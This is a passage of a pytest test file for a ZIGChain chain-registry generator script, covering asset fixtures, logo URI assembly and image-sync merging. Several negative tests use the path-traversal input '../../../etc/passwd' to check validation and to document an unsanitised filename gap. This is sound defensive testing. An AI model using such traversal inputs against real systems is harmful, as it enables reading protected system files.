"""Tests for the generate_chain_registry script."""

import json
import shutil
import subprocess
import sys
from pathlib import Path
from types import SimpleNamespace
from typing import Any

import pytest
from pydantic import ValidationError

from models import DenomUnit, FactoryAsset, IBCAsset, IBCChannel, IBCTrace, LogoUris, NativeAsset, NativeTrace, Socials
from models.tests import check_model_error
from scripts.generate_chain_registry import (
    AssetImages,
    build_native_traces,
    build_traces,
    copy_images,
    erc20_from_ibc,
    generate,
    ibc_asset_to_chain_registry,
    load_assets,
    locate_image_filenames,
    non_ibc_asset_to_chain_registry,
    parse_channel_id_from_path,
    parse_args,
    read_json_files,
    sync_to_chain_registry,
    write_json,
)
from scripts.generate_chain_registry import (
    _GIT_ENV_KEYS,
    _asset_logo_slugs,
    _basename_from_uri,
    _chain_registry_images_base_url,
    _compact_dict,
    _copy_images_merge,
    _copy_tree_replace,
    _declared_logo_slug,
    _declared_logo_uris_dict,
    _ensure_remote,
    _github_https_to_ssh,
    _ibc_computed_images_from_declared_basenames,
    _ibc_images_base_url_override,
    _ibc_logo_chain_name,
    _ibc_logo_uris_from_chain_name,
    _images_for_output,
    _is_our_assets_repo_raw,
    _load_git_env_from_env_file,
    _logo_uris_for_output,
    _merge_images_with_declared_sync,
    _prepare_git_env,
    _rm_tree_if_exists,
    _run,
    _should_preserve_declared_logo_uris,
    _slug_from_logo_uri,
    _slugify_for_filename,
    _supplemental_traces_for_output,
    _sync_chain_folder,
    _timestamped_branch,
    generate_for_network,
)


######################################################################
# Fixtures
######################################################################


@pytest.fixture
def valid_native_asset_payload() -> dict[str, Any]:
    """Minimal valid native asset data for chain-registry input files."""
    return {
        "network": "mainnet",
        "asset_id": "zig",
        "type": "native",
        "symbol": "ZIG",
        "name": "ZIGChain Native Token",
        "decimals": 6,
        "display_denom": "ZIG",
        "base_denom": "uzig",
        "denom_units": [
            {"denom": "uzig", "exponent": 0},
            {"denom": "zig", "exponent": 6},
        ],
    }


HASH = "6490A7EAB61059BFC1CDDEB05917DD70BDF3A611654162A1A47DB930D40D8AF4"


@pytest.fixture
def valid_ibc_asset_payload() -> dict[str, Any]:
    """Minimal valid IBC asset data for chain-registry tests."""
    return {
        "network": "mainnet",
        "asset_id": f"ibc/{HASH}",
        "type": "ibc",
        "symbol": "USDC",
        "name": "Noble USDC",
        "decimals": 6,
        "display_denom": "usdc",
        "base_denom": f"ibc/{HASH}",
        "hash": HASH,
        "origin_chain": "noble",
        "origin_denom": "uusdc",
        "traces": [
            {"type": "ibc", "chain_name": "zigchain", "base_denom": f"ibc/{HASH}", "path": "transfer/channel-3/uusdc"},
        ],
        "channels": [
            {"zigchain_channel": "channel-3", "counterparty_chain": "noble", "counterparty_channel": "channel-175"},
        ],
    }


@pytest.fixture
def valid_factory_asset_payload() -> dict[str, Any]:
    """Minimal valid factory asset data for chain-registry tests."""
    creator = "zig1pvm4lt2xct387nhxynedz0zll9uw0gyh4mftlw"
    subdenom = "panda"
    base = f"coin.{creator}.{subdenom}"
    return {
        "network": "mainnet",
        "asset_id": base,
        "type": "factory",
        "symbol": "PANDA",
        "name": "Factory Panda",
        "decimals": 6,
        "display_denom": "Panda",
        "base_denom": base,
        "creator": creator,
        "subdenom": subdenom,
        "denom_units": [
            {"denom": base, "exponent": 0},
            {"denom": "panda", "exponent": 6},
        ],
    }


@pytest.fixture()
def full_ibc_asset() -> IBCAsset:
    """Fully-populated IBCAsset with ALL required and optional fields.

    Used as a realistic source of IBC asset data for as_logo_uris tests and any
    other test that needs a production-representative IBCAsset instance.

    What is already validated/blocked by the model before reaching as_logo_uris:
      - logo_uris.png / svg are Optional[HttpUrl] — Pydantic rejects bytes, non-URLs,
        and traversal strings like '../../../etc/passwd' at construction time.
      - asset_id / symbol / name / display_denom / description / extended_description
        / coingecko_id reject bytes via AssetBase.reject_bytes_string_fields.
      - decimals / order / is_verified reject bool-as-numeric via dedicated validators.
      - traces / channels / denom_units / images / keywords reject tuple/set inputs.
      - IBCTrace.path must start with 'transfer/'.
      - IBCChannel channel IDs must match channel-<N> or 08-wasm-<N>.
      - IBCTrace.provider restricted to 'eureka' or 'ibc'.
      - base_denom / hash enforce ibc/<64-hex> / 64-hex patterns + bool rejection.
      - asset_id, base_denom, and hash must all agree (cross-field model_validator).

    What reaches as_logo_uris UNVALIDATED:
      - AssetImages.png / svg are plain str (a @dataclass, no Pydantic validation).
        The script populates these from a local directory scan (locate_image_filenames),
        so any filename present on disk — including adversarial ones — is passed through.
    """
    return IBCAsset(
        # ── Required: AssetBase ───────────────────────────────────────────────
        network="mainnet",
        asset_id=f"ibc/{HASH}",
        type="ibc",
        symbol="USDC",
        name="Noble USDC",
        decimals=6,
        display_denom="usdc",
        # ── Optional: AssetBase ───────────────────────────────────────────────
        order=1,
        description="Circle's USD Coin bridged to ZIGChain via the Noble channel.",
        extended_description=(
            "USD Coin (USDC) is a fully reserved stablecoin issued by Circle, "
            "pegged 1:1 to the US dollar and redeemable on a 1:1 basis."
        ),
        keywords=["stablecoin", "ibc", "noble", "circle"],
        logo_uris=LogoUris(
            chain_name="noble",
            png="https://raw.githubusercontent.com/cosmos/chain-registry/master/noble/images/USDCoin.png",
            svg="https://raw.githubusercontent.com/cosmos/chain-registry/master/noble/images/USDCoin.svg",
        ),
        images=[{"chain_name": "noble", "base_denom": "uusdc"}],
        socials=Socials(website="https://circle.com/usdc"),
        coingecko_id="usd-coin",
        is_verified=True,
        # ── Required: IBCAsset-specific ───────────────────────────────────────
        base_denom=f"ibc/{HASH}",
        hash=HASH,
        origin_chain="noble",
        origin_denom="uusdc",
        traces=[
            IBCTrace(
                type="ibc",
                chain_name="zigchain",
                base_denom=f"ibc/{HASH}",
                path="transfer/channel-3/uusdc",
                provider="ibc",
            ),
            NativeTrace(
                type="additional-mintage",
                counterparty={"chain_name": "ethereum", "base_denom": "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48"},
            ),
        ],
        channels=[
            IBCChannel(
                zigchain_channel="channel-3",
                counterparty_chain="noble",
                counterparty_channel="channel-175",
            ),
            IBCChannel(
                zigchain_channel="channel-12",
                counterparty_chain="osmosis",
                counterparty_channel="channel-9999",
            ),
        ],
        denom_units=[
            DenomUnit(denom=f"ibc/{HASH}", exponent=0),
            DenomUnit(denom="usdc", exponent=6, aliases=["USDC"]),
        ],
    )


@pytest.fixture()
def zigchain_zig_trace() -> IBCTrace:
    """The zigchain-side IBC hop for the USDC/noble asset. Reused across build_traces tests."""
    return IBCTrace(
        type="ibc",
        chain_name="zigchain",
        base_denom=f"ibc/{HASH}",
        path="transfer/channel-3/uusdc",
    )


@pytest.fixture()
def ibc_asset_noble_hop() -> IBCAsset:
    """IBCAsset with a zigchain hop and a noble hop — the minimal two-hop case.

    Used by build_traces tests that need a non-zigchain trace to be emitted.
    noble is the origin chain; noble channel is declared in channels.
    """
    return IBCAsset(
        network="mainnet",
        asset_id=f"ibc/{HASH}",
        type="ibc",
        symbol="USDC",
        name="Noble USDC",
        decimals=6,
        display_denom="usdc",
        base_denom=f"ibc/{HASH}",
        hash=HASH,
        origin_chain="noble",
        origin_denom="uusdc",
        traces=[
            IBCTrace(type="ibc", chain_name="zigchain", base_denom=f"ibc/{HASH}", path="transfer/channel-3/uusdc"),
            IBCTrace(type="ibc", chain_name="noble", base_denom="uusdc", path="transfer/channel-175/uusdc"),
        ],
        channels=[
            IBCChannel(zigchain_channel="channel-3", counterparty_chain="noble", counterparty_channel="channel-175"),
        ],
    )


@pytest.fixture()
def repo_root(tmp_path: Path) -> Path:
    """Minimal repository skeleton with assets/{native,factory,ibc} and logos directories."""

    root = tmp_path / "repo"
    root.mkdir()
    (root / "assets" / "native").mkdir(parents=True)
    (root / "assets" / "factory").mkdir(parents=True)
    (root / "assets" / "ibc").mkdir(parents=True)
    (root / "logos").mkdir(parents=True)
    return root


######################################################################
# Tests for AssetImages.as_logo_uris
######################################################################

# ----------------
# Positive tests for AssetImages.as_logo_uris
# ----------------


def test_as_logo_uris_both_png_and_svg_returns_both_keys(full_ibc_asset: IBCAsset) -> None:
    """as_logo_uris returns 'png' and 'svg' keys built from filenames derived from a real IBCAsset.

    Simulates the normal script path: filenames come from logos/ directory scan and the
    base_url is built from the asset's logo_uris.chain_name via _chain_registry_images_base_url.
    """

    # Build the GitHub raw folder URL for the chain that owns this asset's images.
    base_url = _chain_registry_images_base_url(chain_name=full_ibc_asset.logo_uris.chain_name)

    # Extract just the filename from each full URL stored in the model.
    png_file = _basename_from_uri(str(full_ibc_asset.logo_uris.png))
    svg_file = _basename_from_uri(str(full_ibc_asset.logo_uris.svg))

    images = AssetImages(png=png_file, svg=svg_file)
    result = images.as_logo_uris(base_url)

    # Both keys must be present since both filenames were set.
    assert "png" in result and "svg" in result
    # Each value must be exactly base_url + "/" + filename.
    assert result["png"] == f"{base_url}/{png_file}"
    assert result["svg"] == f"{base_url}/{svg_file}"


def test_as_logo_uris_only_png_set_returns_png_key_only(full_ibc_asset: IBCAsset) -> None:
    """as_logo_uris returns only 'png' when svg file is absent (svg=None in AssetImages)."""

    base_url = _chain_registry_images_base_url(chain_name=full_ibc_asset.logo_uris.chain_name)
    png_file = _basename_from_uri(str(full_ibc_asset.logo_uris.png))
    images = AssetImages(png=png_file, svg=None)

    result = images.as_logo_uris(base_url)

    # Exact key set: "png" present, "svg" absent — catches both missing and unexpected keys.
    assert set(result.keys()) == {"png"}
    assert result["png"] == f"{base_url}/{png_file}"


def test_as_logo_uris_only_svg_set_returns_svg_key_only(full_ibc_asset: IBCAsset) -> None:
    """as_logo_uris returns only 'svg' when png file is absent (png=None in AssetImages)."""

    base_url = _chain_registry_images_base_url(chain_name=full_ibc_asset.logo_uris.chain_name)
    svg_file = _basename_from_uri(str(full_ibc_asset.logo_uris.svg))
    images = AssetImages(png=None, svg=svg_file)

    result = images.as_logo_uris(base_url)

    assert set(result.keys()) == {"svg"}
    assert result["svg"] == f"{base_url}/{svg_file}"


def test_as_logo_uris_url_is_base_slash_filename(full_ibc_asset: IBCAsset) -> None:
    """as_logo_uris concatenates base_url + '/' + filename exactly — no encoding or normalisation."""

    base_url = _chain_registry_images_base_url(chain_name=full_ibc_asset.logo_uris.chain_name)
    png_file = _basename_from_uri(str(full_ibc_asset.logo_uris.png))
    images = AssetImages(png=png_file, svg=None)

    result = images.as_logo_uris(base_url)

    # Contract: output is exactly base_url + "/" + filename — no encoding, no extra segments.
    # If the concatenation logic changes (e.g. URL encoding added), this assertion breaks.
    assert result["png"] == f"{base_url}/{png_file}"


def test_as_logo_uris_always_returns_dict(full_ibc_asset: IBCAsset) -> None:
    """as_logo_uris return type is always dict, never None — even when both fields are None."""

    base_url = _chain_registry_images_base_url(chain_name=full_ibc_asset.logo_uris.chain_name)
    assert isinstance(AssetImages(png="a.png", svg="a.svg").as_logo_uris(base_url), dict)
    assert isinstance(AssetImages(png=None, svg=None).as_logo_uris(base_url), dict)


def test_as_logo_uris_both_none_returns_empty_dict(full_ibc_asset: IBCAsset) -> None:
    """as_logo_uris returns an empty dict when both png and svg are None.

    Represents an IBC asset whose logo file does not exist locally in logos/.
    """

    base_url = _chain_registry_images_base_url(chain_name=full_ibc_asset.logo_uris.chain_name)
    result = AssetImages(png=None, svg=None).as_logo_uris(base_url)

    assert result == {}


def test_as_logo_uris_empty_string_png_treated_as_absent(full_ibc_asset: IBCAsset) -> None:
    """as_logo_uris treats empty string png as falsy — 'png' key absent, consistent with None."""

    base_url = _chain_registry_images_base_url(chain_name=full_ibc_asset.logo_uris.chain_name)
    result = AssetImages(png="", svg=None).as_logo_uris(base_url)

    assert "png" not in result


def test_as_logo_uris_empty_string_svg_treated_as_absent(full_ibc_asset: IBCAsset) -> None:
    """as_logo_uris treats empty string svg as falsy — 'svg' key absent, consistent with None."""

    base_url = _chain_registry_images_base_url(chain_name=full_ibc_asset.logo_uris.chain_name)
    result = AssetImages(png=None, svg="").as_logo_uris(base_url)

    assert "svg" not in result


# ----------------
# Negative tests for AssetImages.as_logo_uris
# ----------------

def test_as_logo_uris_base_url_trailing_slash_produces_double_slash(full_ibc_asset: IBCAsset) -> None:
    """as_logo_uris does not deduplicate slashes — a trailing slash in base_url causes double slash.

    Documents current (unguarded) behaviour.  Callers must not include a trailing slash.
    _chain_registry_images_base_url never emits one, so this only arises if as_logo_uris is
    called with a manually-constructed base_url.
    """

    png_file = _basename_from_uri(str(full_ibc_asset.logo_uris.png))
    result = AssetImages(png=png_file, svg=None).as_logo_uris("https://example.com/images/")

    assert result["png"] == f"https://example.com/images//{png_file}"


def test_as_logo_uris_filename_with_spaces_not_url_encoded(full_ibc_asset: IBCAsset) -> None:
    """as_logo_uris performs no URL encoding — spaces in filenames appear literally.

    NOTE: IBCAsset.logo_uris.png is Optional[HttpUrl]; Pydantic rejects spaces in URLs
    at model construction time.  This gap is only reachable via AssetImages (the plain
    dataclass populated from the local logos/ directory scan).
    """
    base_url = _chain_registry_images_base_url(chain_name=full_ibc_asset.logo_uris.chain_name)
    result = AssetImages(png="my token.png", svg=None).as_logo_uris(base_url)

    assert " " in result["png"]


@pytest.mark.xfail(
    strict=True,
    reason=(
        "as_logo_uris does not sanitise filenames — traversal strings pass through verbatim. "
        "In practice this cannot be reached: _slugify_for_filename strips '.' and '/' before "
        "any filename reaches AssetImages, and logos/ is team-controlled. "
        "Marked xfail to document the unguarded method without blocking CI."
    ),
)
def test_as_logo_uris_traversal_in_png_filename_not_in_output_url(full_ibc_asset: IBCAsset) -> None:
    """as_logo_uris must not embed path traversal from png filename into the output URL.

    IBCAsset.logo_uris.png is Optional[HttpUrl]: Pydantic rejects '../../../etc/passwd'
    as an invalid URL at model construction time (the full_ibc_asset fixture confirms this
    boundary holds).  However, AssetImages.png is an unvalidated str — if a traversal string
    ever reached this method directly it would pass through into the output URL unguarded.
    All current callers prevent this via _slugify_for_filename and Path.name.
    """
    base_url = _chain_registry_images_base_url(chain_name=full_ibc_asset.logo_uris.chain_name)
    result = AssetImages(png="../../../etc/passwd", svg=None).as_logo_uris(base_url)

    assert "../" not in result["png"], "path traversal must not appear in as_logo_uris output"


def test_as_logo_uris_logo_uris_traversal_blocked_at_model_level(full_ibc_asset: IBCAsset) -> None:
    """LogoUris.png (HttpUrl) rejects path traversal at model construction — never reaches as_logo_uris.

    Contrasts with the AssetImages traversal xfail tests: data flowing through the Pydantic
    model is safe because HttpUrl validation runs before anything else.
    """
    import pydantic

    # excinfo captures the exception so we can assert on its message below.
    with pytest.raises(pydantic.ValidationError) as excinfo:
        # '../../../etc/passwd' is not a valid URL — Pydantic must reject it here,
        # before the value can ever reach as_logo_uris.
        LogoUris(
            chain_name=full_ibc_asset.logo_uris.chain_name,
            png="../../../etc/passwd",
            svg=None,
        )

    # Confirm Pydantic flagged the png field as an invalid URL, not some other error.
    assert "url_parsing" in str(excinfo.value), (
        "expected Pydantic to reject the traversal string as an invalid URL on the png field"
    )


######################################################################
# Tests for AssetImages.as_images_entry
######################################################################

# ----------------
# Positive tests for AssetImages.as_images_entry
# ----------------


def test_as_images_entry_both_png_and_svg_returns_single_entry_with_both_keys(full_ibc_asset: IBCAsset) -> None:
    """as_images_entry returns a list with exactly one dict containing both 'png' and 'svg' keys."""

    base_url = _chain_registry_images_base_url(chain_name=full_ibc_asset.logo_uris.chain_name)
    png_file = _basename_from_uri(str(full_ibc_asset.logo_uris.png))
    svg_file = _basename_from_uri(str(full_ibc_asset.logo_uris.svg))
    images = AssetImages(png=png_file, svg=svg_file)

    result = images.as_images_entry(base_url)

    # Outer structure: a list with exactly one entry — never more, never less.
    assert isinstance(result, list)
    assert len(result) == 1
    # Inner dict: both keys present with correct assembled URLs.
    assert "png" in result[0] and "svg" in result[0]
    assert result[0]["png"] == f"{base_url}/{png_file}"
    assert result[0]["svg"] == f"{base_url}/{svg_file}"


def test_as_images_entry_only_png_set_entry_has_png_key_only(full_ibc_asset: IBCAsset) -> None:
    """as_images_entry with only png set returns [{png: url}] — no svg key in the dict."""

    base_url = _chain_registry_images_base_url(chain_name=full_ibc_asset.logo_uris.chain_name)
    png_file = _basename_from_uri(str(full_ibc_asset.logo_uris.png))
    images = AssetImages(png=png_file, svg=None)

    result = images.as_images_entry(base_url)

    assert len(result) == 1
    # Exact key set: "png" present, "svg" absent — catches both missing and unexpected keys.
    assert set(result[0].keys()) == {"png"}
    assert result[0]["png"] == f"{base_url}/{png_file}"


def test_as_images_entry_only_svg_set_entry_has_svg_key_only(full_ibc_asset: IBCAsset) -> None:
    """as_images_entry with only svg set returns [{svg: url}] — no png key in the dict."""

    base_url = _chain_registry_images_base_url(chain_name=full_ibc_asset.logo_uris.chain_name)
    svg_file = _basename_from_uri(str(full_ibc_asset.logo_uris.svg))
    images = AssetImages(png=None, svg=svg_file)

    result = images.as_images_entry(base_url)

    assert len(result) == 1
    # Exact key set: "svg" present, "png" absent.
    assert set(result[0].keys()) == {"svg"}
    assert result[0]["svg"] == f"{base_url}/{svg_file}"


def test_as_images_entry_url_is_base_slash_filename(full_ibc_asset: IBCAsset) -> None:
    """as_images_entry assembles base_url + '/' + filename exactly — no encoding or normalisation."""

    base_url = _chain_registry_images_base_url(chain_name=full_ibc_asset.logo_uris.chain_name)
    png_file = _basename_from_uri(str(full_ibc_asset.logo_uris.png))
    images = AssetImages(png=png_file, svg=None)

    result = images.as_images_entry(base_url)

    # Contract: same concatenation formula as as_logo_uris — base_url + "/" + filename.
    assert result[0]["png"] == f"{base_url}/{png_file}"


def test_as_images_entry_always_returns_list(full_ibc_asset: IBCAsset) -> None:
    """as_images_entry return type is always list — never None, even when both fields are None."""

    base_url = _chain_registry_images_base_url(chain_name=full_ibc_asset.logo_uris.chain_name)
    # Both set — should be a list.
    assert isinstance(AssetImages(png="a.png", svg="a.svg").as_images_entry(base_url), list)
    # Both absent — should still be a list (empty), never None.
    assert isinstance(AssetImages(png=None, svg=None).as_images_entry(base_url), list)

def test_as_images_entry_both_none_returns_empty_list(full_ibc_asset: IBCAsset) -> None:
    """as_images_entry returns [] when both png and svg are None — no entry is appended.

    Distinct from as_logo_uris: the outer guard 'if self.png or self.svg' means
    both-falsy produces [] not [{}].  An empty list signals the asset has no local images.
    """

    base_url = _chain_registry_images_base_url(chain_name=full_ibc_asset.logo_uris.chain_name)
    result = AssetImages(png=None, svg=None).as_images_entry(base_url)

    # Must be an empty list — not [{}], which would insert a blank images entry into assetlist.json.
    assert result == []

def test_as_images_entry_both_empty_strings_returns_empty_list(full_ibc_asset: IBCAsset) -> None:
    """as_images_entry returns [] when both png and svg are empty strings.

    Empty string is falsy in Python — 'if self.png or self.svg' evaluates False for ("", ""),
    so no entry is appended.  Result is [] not [{}].
    """

    base_url = _chain_registry_images_base_url(chain_name=full_ibc_asset.logo_uris.chain_name)
    result = AssetImages(png="", svg="").as_images_entry(base_url)

    # Empty strings must not produce a blank dict inside the list.
    assert result == []

def test_as_images_entry_empty_string_png_treated_as_absent(full_ibc_asset: IBCAsset) -> None:
    """as_images_entry treats empty string png as falsy — no 'png' key in the entry dict."""

    base_url = _chain_registry_images_base_url(chain_name=full_ibc_asset.logo_uris.chain_name)
    svg_file = _basename_from_uri(str(full_ibc_asset.logo_uris.svg))
    # png="" is falsy, svg is set — should produce [{svg: url}] with no png key.
    result = AssetImages(png="", svg=svg_file).as_images_entry(base_url)

    assert len(result) == 1
    assert "png" not in result[0]
    assert "svg" in result[0]

# ----------------
# Negative tests for AssetImages.as_images_entry
# ----------------

def test_as_images_entry_trailing_slash_base_url_produces_double_slash(full_ibc_asset: IBCAsset) -> None:
    """as_images_entry does not deduplicate slashes — trailing slash in base_url causes double slash.

    Documents current unguarded behaviour.  _chain_registry_images_base_url never emits a
    trailing slash, so this only arises from a manually-constructed base_url.
    """

    png_file = _basename_from_uri(str(full_ibc_asset.logo_uris.png))
    # Pass a base_url that ends with "/" to trigger the double-slash gap.
    result = AssetImages(png=png_file, svg=None).as_images_entry("https://example.com/images/")

    # Documents the gap: "//" appears in the output URL, not a single "/".
    assert "//" in result[0]["png"]


def test_as_images_entry_filename_with_spaces_not_url_encoded(full_ibc_asset: IBCAsset) -> None:
    """as_images_entry performs no URL encoding — spaces in filenames appear literally in output.

    Only reachable via a direct AssetImages construction; locate_image_filenames uses
    _slugify_for_filename which strips spaces before any filename reaches AssetImages.
    """

    base_url = _chain_registry_images_base_url(chain_name=full_ibc_asset.logo_uris.chain_name)
    result = AssetImages(png="my token.png", svg=None).as_images_entry(base_url)

    # Literal space in output — documents the absence of URL encoding.
    assert " " in result[0]["png"]


@pytest.mark.xfail(
    strict=True,
    reason=(
        "as_images_entry does not sanitise filenames — traversal strings pass through verbatim. "
        "In practice unreachable: _slugify_for_filename strips '.' and '/' before any filename "
        "reaches AssetImages, and logos/ is team-controlled."
    ),
)
def test_as_images_entry_traversal_in_png_filename_not_in_output_url(full_ibc_asset: IBCAsset) -> None:
    """as_images_entry must not embed path traversal from png filename into the output URL."""

    base_url = _chain_registry_images_base_url(chain_name=full_ibc_asset.logo_uris.chain_name)
    result = AssetImages(png="../../../etc/passwd", svg=None).as_images_entry(base_url)

    assert "../" not in result[0]["png"], "path traversal must not appear in as_images_entry output"


######################################################################
# Tests for _merge_images_with_declared_sync
######################################################################

# ----------------
# Positive tests for _merge_images_with_declared_sync
# ----------------


def test_merge_images_with_declared_sync_no_declared_returns_computed_entry() -> None:
    """When declared_images is None, the computed png/svg are returned as a single entry."""

    computed = AssetImages(png="zig.png", svg="zig.svg")
    result = _merge_images_with_declared_sync(
        declared_images=None, computed=computed, base_url="https://example.com/img"
    )

    assert len(result) == 1
    assert result[0]["png"] == "https://example.com/img/zig.png"
    assert result[0]["svg"] == "https://example.com/img/zig.svg"


def test_merge_images_with_declared_sync_no_declared_nothing_computed_returns_empty_list() -> None:
    """When declared_images is None and computed has no files, returns []."""

    result = _merge_images_with_declared_sync(
        declared_images=None,
        computed=AssetImages(png=None, svg=None),
        base_url="https://example.com/img",
    )

    # No declared, no files on disk — nothing to put in the images array.
    assert result == []


def test_merge_images_with_declared_sync_no_declared_only_png_computed() -> None:
    """When declared_images is None and only png is on disk, returns [{png: url}]."""

    result = _merge_images_with_declared_sync(
        declared_images=None,
        computed=AssetImages(png="zig.png", svg=None),
        base_url="https://example.com/img",
    )

    assert len(result) == 1
    assert set(result[0].keys()) == {"png"}
    assert result[0]["png"] == "https://example.com/img/zig.png"


def test_merge_images_with_declared_sync_no_declared_only_svg_computed() -> None:
    """When declared_images is None and only svg is on disk, returns [{svg: url}]."""

    result = _merge_images_with_declared_sync(
        declared_images=None,
        computed=AssetImages(png=None, svg="zig.svg"),
        base_url="https://example.com/img",
    )

    assert len(result) == 1
    assert set(result[0].keys()) == {"svg"}
    assert result[0]["svg"] == "https://example.com/img/zig.svg"


def test_merge_images_with_declared_sync_shortcut_form_converts_to_image_sync() -> None:
    """Shortcut form {chain_name, base_denom} is wrapped into image_sync and merged with computed URLs."""

    computed = AssetImages(png="usdc.png", svg=None)
    declared = [{"chain_name": "noble", "base_denom": "uusdc"}]
    result = _merge_images_with_declared_sync(
        declared_images=declared, computed=computed, base_url="https://ex/img"
    )

    assert len(result) == 1
    # chain_name and base_denom are wrapped under image_sync.
    assert result[0]["image_sync"] == {"chain_name": "noble", "base_denom": "uusdc"}
    # Computed png URL is merged in alongside image_sync.
    assert result[0]["png"] == "https://ex/img/usdc.png"


def test_merge_images_with_declared_sync_shortcut_both_computed_urls_merged() -> None:
    """Shortcut form merges both png and svg from computed when both are available."""

    computed = AssetImages(png="usdc.png", svg="usdc.svg")
    declared = [{"chain_name": "noble", "base_denom": "uusdc"}]
    result = _merge_images_with_declared_sync(
        declared_images=declared, computed=computed, base_url="https://ex/img"
    )

    assert len(result) == 1
    assert result[0]["image_sync"] == {"chain_name": "noble", "base_denom": "uusdc"}
    assert result[0]["png"] == "https://ex/img/usdc.png"
    assert result[0]["svg"] == "https://ex/img/usdc.svg"


def test_merge_images_with_declared_sync_shortcut_no_computed_produces_image_sync_only() -> None:
    """Shortcut form with no computed files produces an entry with only image_sync — no png/svg keys."""

    declared = [{"chain_name": "noble", "base_denom": "uusdc"}]
    result = _merge_images_with_declared_sync(
        declared_images=declared,
        computed=AssetImages(png=None, svg=None),
        base_url="https://ex/img",
    )

    assert len(result) == 1
    # image_sync is present but no png/svg because nothing was found on disk.
    assert result[0] == {"image_sync": {"chain_name": "noble", "base_denom": "uusdc"}}


def test_merge_images_with_declared_sync_multiple_shortcut_entries_produces_multiple_entries() -> None:
    """Multiple shortcut entries produce one image_sync entry each."""

    computed = AssetImages(png="usdc.png", svg=None)
    declared = [
        {"chain_name": "noble", "base_denom": "uusdc"},
        {"chain_name": "osmosis", "base_denom": "uusdc"},
    ]
    result = _merge_images_with_declared_sync(
        declared_images=declared, computed=computed, base_url="https://ex/img"
    )

    # One output entry per declared shortcut.
    assert len(result) == 2
    assert result[0]["image_sync"]["chain_name"] == "noble"
    assert result[1]["image_sync"]["chain_name"] == "osmosis"
    # Both entries get the same computed png URL.
    assert result[0]["png"] == result[1]["png"] == "https://ex/img/usdc.png"


def test_merge_images_with_declared_sync_full_form_fills_missing_png_svg() -> None:
    """Full Cosmos form (has image_sync already) gets missing png/svg filled from computed."""

    computed = AssetImages(png="usdc.png", svg="usdc.svg")
    declared = [{"image_sync": {"chain_name": "noble", "base_denom": "uusdc"}}]
    result = _merge_images_with_declared_sync(
        declared_images=declared, computed=computed, base_url="https://ex/img"
    )

    assert len(result) == 1
    # Declared image_sync is preserved as-is.
    assert result[0]["image_sync"] == {"chain_name": "noble", "base_denom": "uusdc"}
    # Missing png and svg are filled in from computed.
    assert result[0]["png"] == "https://ex/img/usdc.png"
    assert result[0]["svg"] == "https://ex/img/usdc.svg"


def test_merge_images_with_declared_sync_full_form_declared_png_not_overwritten() -> None:
    """Full form: if png is already declared, the computed png must NOT overwrite it."""

    computed = AssetImages(png="usdc.png", svg="usdc.svg")
    declared = [
        {
            "image_sync": {"chain_name": "noble", "base_denom": "uusdc"},
            "png": "https://declared.com/special-logo.png",
        }
    ]
    result = _merge_images_with_declared_sync(
        declared_images=declared, computed=computed, base_url="https://ex/img"
    )

    assert len(result) == 1
    # Declared png is preserved — computed must not overwrite it.
    assert result[0]["png"] == "https://declared.com/special-logo.png"
    # svg was absent in declared, so it is filled from computed.
    assert result[0]["svg"] == "https://ex/img/usdc.svg"


def test_merge_images_with_declared_sync_full_form_both_urls_declared_nothing_filled() -> None:
    """Full form: if both png and svg are declared, nothing from computed is added."""

    computed = AssetImages(png="usdc.png", svg="usdc.svg")
    declared = [
        {
            "image_sync": {"chain_name": "noble", "base_denom": "uusdc"},
            "png": "https://declared.com/logo.png",
            "svg": "https://declared.com/logo.svg",
        }
    ]
    result = _merge_images_with_declared_sync(
        declared_images=declared, computed=computed, base_url="https://ex/img"
    )

    assert len(result) == 1
    # Both declared values are preserved exactly.
    assert result[0]["png"] == "https://declared.com/logo.png"
    assert result[0]["svg"] == "https://declared.com/logo.svg"
    # No extra keys from computed were injected.
    assert set(result[0].keys()) == {"image_sync", "png", "svg"}


def test_merge_images_with_declared_sync_full_form_theme_preserved() -> None:
    """Full form: arbitrary keys like 'theme' are preserved and png/svg are filled from computed."""

    computed = AssetImages(png="usdc.png", svg="usdc.svg")
    declared = [
        {
            "image_sync": {"chain_name": "noble", "base_denom": "uusdc"},
            "theme": {"primary_color_hex": "#0000ff"},
        }
    ]
    result = _merge_images_with_declared_sync(
        declared_images=declared, computed=computed, base_url="https://ex/img"
    )

    assert len(result) == 1
    # theme key is passed through untouched.
    assert result[0]["theme"] == {"primary_color_hex": "#0000ff"}
    # Missing png/svg are filled from computed.
    assert result[0]["png"] == "https://ex/img/usdc.png"
    assert result[0]["svg"] == "https://ex/img/usdc.svg"


def test_merge_images_with_declared_sync_mixed_shortcut_and_full_form() -> None:
    """A list mixing shortcut and full-form entries produces correct output for each."""

    computed = AssetImages(png="usdc.png", svg=None)
    declared = [
        # Shortcut form — will be wrapped into image_sync.
        {"chain_name": "noble", "base_denom": "uusdc"},
        # Full form — image_sync already present, svg will be filled (but computed has no svg).
        {"image_sync": {"chain_name": "osmosis", "base_denom": "uusdc"}, "png": "https://other.com/logo.png"},
    ]
    result = _merge_images_with_declared_sync(
        declared_images=declared, computed=computed, base_url="https://ex/img"
    )

    assert len(result) == 2
    # First entry came from shortcut — has image_sync + computed png.
    assert "image_sync" in result[0]
    assert result[0]["image_sync"]["chain_name"] == "noble"
    assert result[0]["png"] == "https://ex/img/usdc.png"
    # Second entry came from full form — declared png preserved, no svg (computed has none).
    assert result[1]["image_sync"]["chain_name"] == "osmosis"
    assert result[1]["png"] == "https://other.com/logo.png"
    assert "svg" not in result[1]


def test_merge_images_with_declared_sync_pydantic_model_uses_model_dump() -> None:
    """Items with a model_dump method (Pydantic models) are serialised via model_dump first."""

    from pydantic import BaseModel

    # Inline class: minimal stand-in for the real ImageSyncPointer model.
    class FakeImageSync(BaseModel):
        chain_name: str
        base_denom: str

    computed = AssetImages(png="usdc.png", svg=None)

    # Pass a Pydantic model instance instead of a plain dict.
    result = _merge_images_with_declared_sync(
        declared_images=[FakeImageSync(chain_name="noble", base_denom="uusdc")],
        computed=computed,
        base_url="https://ex/img",
    )

    # Output is identical to passing the equivalent plain dict — the model_dump branch
    # is transparent: a Pydantic object and a dict with the same fields produce the same result.
    assert len(result) == 1
    assert result[0]["image_sync"] == {"chain_name": "noble", "base_denom": "uusdc"}
    assert result[0]["png"] == "https://ex/img/usdc.png"

def test_merge_images_with_declared_sync_skips_non_dict_items() -> None:
    """Non-dict items in declared_images are silently skipped; valid dict items are still processed."""

    computed = AssetImages(png=None, svg=None)
    # Mix of invalid types and one valid shortcut dict.
